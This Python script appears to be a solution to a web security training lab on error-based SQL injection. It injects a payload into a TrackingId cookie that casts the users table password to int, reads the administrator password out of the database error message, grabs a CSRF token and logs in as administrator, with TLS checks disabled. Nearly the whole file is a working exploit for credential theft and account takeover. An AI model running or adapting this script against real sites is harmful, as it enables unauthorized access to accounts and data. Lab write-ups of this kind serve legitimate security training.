import requests
import argparse
import urllib3
from urllib.parse import urljoin
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def get_csrf_token(session, url, proxies=None):
    try:
        login_url = urljoin(url, 'login')
        print(f"Getting CSRF token from: {login_url}")
        response = session.get(login_url, proxies=proxies, verify=False, timeout=30)
        
        if response.status_code != 200:
            print("Failed to get login page")
            return None
            
        bs = BeautifulSoup(response.text, 'html.parser')
        csrf_token = None
        
        csrf_input = bs.find('input', {'name': 'csrf'})
        if csrf_input and csrf_input.get('value'):
            csrf_token = csrf_input['value']
    
        if csrf_token:
            print(f"Found CSRF token: {csrf_token}")
            return csrf_token
            
        print("CSRF token not found in the page")
        return None
            
    except requests.exceptions.RequestException as e:
        print(f"Error getting CSRF token: {e}")
        return None


def sql_injection_test(url, use_proxy=False):
    try:
        proxies = {
            'http': '127.0.0.1:8080',
            'https': '127.0.0.1:8080'
        } if use_proxy else None
        
        response = requests.get(url, proxies=proxies, verify=False, timeout=30)
        cookies = {
            'TrackingId': "a" + "' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--"
        }
        
        response = requests.get(url, cookies=cookies, proxies=proxies, verify=False, timeout=30)
        bs = BeautifulSoup(response.text, 'html.parser')
        error_element = bs.find('h4', string=lambda x: 'ERROR:' in x)
        
        if not error_element:
            print("Error message not found")
            return False, None
            
        password = error_element.text.split('"')[1]
        print(f"Extracted password: {password}")
            
        session = requests.Session()
        csrf_token = get_csrf_token(session, url, proxies)
        
        if not csrf_token:
            print("Failed to get CSRF token")
            return False, None
            
        login_payload = {
            'csrf': csrf_token,
            'username': 'administrator',
            'password': password
        }
        
        login_url = urljoin(url, 'login')
        login_response = session.post(login_url, data=login_payload, proxies=proxies, verify=False, timeout=30)
        
        return is_solved(login_response)
        
    except requests.exceptions.RequestException as e:
        print(f"Error during SQL injection test: {e}")
        return False, None


def is_solved(response):
    try:
        if response.status_code != 200:
            return False, response
        return "log out" in response.text.lower(), response
    except:
        return False, None


def main():
    parser = argparse.ArgumentParser(description='SQL Injection for lab 13')
    parser.add_argument('-u', '--url', required=True, help='Target URL (Example: https://example.com/)')
    parser.add_argument('-p', '--proxy', action='store_true', help='Use proxy (127.0.0.1:8080)')
    
    args = parser.parse_args()
    
    if not args.url.endswith('/'):
        args.url += '/'
        
    print("Starting SQL Injection Test...")
    print(f"Target URL: {args.url}")
    
    success, response = sql_injection_test(args.url, args.proxy)
    if success:
        print("SQL Injection successful")
    else:
        print(f"SQL Injection failed. HTTP Status Code: {response.status_code} Response Length: {len(response.text)}")

if __name__ == "__main__":
    main()

